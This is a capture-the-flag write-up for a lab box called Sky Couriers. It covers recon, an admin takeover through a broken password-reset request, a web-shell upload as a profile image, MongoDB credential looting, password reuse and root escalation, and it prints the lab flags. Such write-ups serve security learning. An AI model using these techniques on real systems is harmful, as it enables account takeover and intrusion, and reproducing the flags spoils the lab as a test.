# writeups

`skycouriers.thm`
`/v2/admin/login.html`
`../admin/reg.php`

===nmap recon===
```
22/tcp    open     ssh             syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6dc8869dea1738e845ba13e279f0724 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6bea185d8dc79e9a012cdd50c5f8c805 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef06d7e4b165156e9462ccddf08a1a24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
32/tcp    filtered unknown         no-response
80/tcp    open     http            syn-ack     Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sky Couriers
```

===dir listing===
```
[12:29:07] 301 -  319B  - /assets  ->  http://skycouriers.thm/assets/       
[12:29:07] 200 -    1KB - /assets/                                          
[12:29:33] 200 -   19KB - /index.html                                       
[12:29:56] 301 -  323B  - /phpMyAdmin  ->  http://skycouriers.thm/phpMyAdmin/
[12:29:59] 200 -   19KB - /phpMyAdmin/index.php                             
[12:29:59] 200 -   19KB - /phpMyAdmin/                                      
[12:30:09] 403 -  280B  - /server-status/                                   
[12:30:10] 403 -  280B  - /server-status                                    
[12:30:25] 301 -  315B  - /v2  ->  http://skycouriers.thm/v2/               
[12:30:26] 302 -   20KB - /v2/  ->  /v2/admin/login.html   
```
`admin@sky.thm`

I created an account, I see
`http://10.10.18.111/v2/profile.php`, I can upload in image like a profile pic, but it
an admin function, so let's jump right in reset password page, and if you look further
you gonna see, they passed away the user in the form, so like i read we can got a broken 
authentification here if there a logic fail in the coding, let's see by trying it in burpSuite,
we know already the email or username for the admin, so let's try
```
Content-Disposition: form-data; name="uname"

admin@sky.thm
-----------------------------37568551644779702721314001566
Content-Disposition: form-data; name="npass"

test
-----------------------------37568551644779702721314001566
Content-Disposition: form-data; name="cpass"

test
```
and I got a message "Password changed", after that I logout and connect back, but with new admin creds.


right now we have access to the profile, and we can upload a picture and maybe got a shell,
I upload my `reverse.php` and I got "Image saved". after that I look in burpsuite history and I
see a dir `http://10.10.178.186/v2/profileimages/` but dirlistinr was disabled but, I already know
my filename, so I entered it and here I got the revSHELL,
```
www-data@sky:/home/webdeveloper$ cat user.txt
cat user.txt
63191e4ece37523c9fe6bb62a5e64d45
```

after I found this, `ss -tl`(linux command)
```
State   Recv-Q  Send-Q     Local Address:Port       Peer Address:Port  Process  
LISTEN  0       70             127.0.0.1:33060           0.0.0.0:*              
LISTEN  0       511            127.0.0.1:9000            0.0.0.0:*              
LISTEN  0       4096           127.0.0.1:27017           0.0.0.0:*              
LISTEN  0       151            127.0.0.1:mysql           0.0.0.0:*              
LISTEN  0       4096       127.0.0.53%lo:domain          0.0.0.0:*              
LISTEN  0       128              0.0.0.0:ssh             0.0.0.0:*              
LISTEN  0       511                    *:http                  *:*              
LISTEN  0       128                 [::]:ssh                [::]:*   
```
I google the port 27017
`The port 27017 is used for mongoDB server, an important module for EAP Controller. `

some command to help
```
mongo <ip> : connect with the db
show dbs : show databases
use <dbName> : use this db
show collections : show tables
db.user.find() : retrieve all users

```
and I got this creds
`{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }`
then maybe they use the same password for the userLogin, right!!! they use the same password, now
I'm in webdevelopper, then I did `sudo -l`, and I saw
```
(ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```
but don't mind that for now, when we look `id` you'll see, webdeveloper user, are in the sudo group
so that mean we can execute some command/file with root priv, so I created a shell.c and put some code 
that will give us root priv, and further I put a writeups link to help with this final parts
```
# cat /root/root.txt
3a62d897c40a815ecbe267df2f533ac6
```

NOTICE:
https://guarina0x0.github.io/content/writeups/tryhackme/Road.html
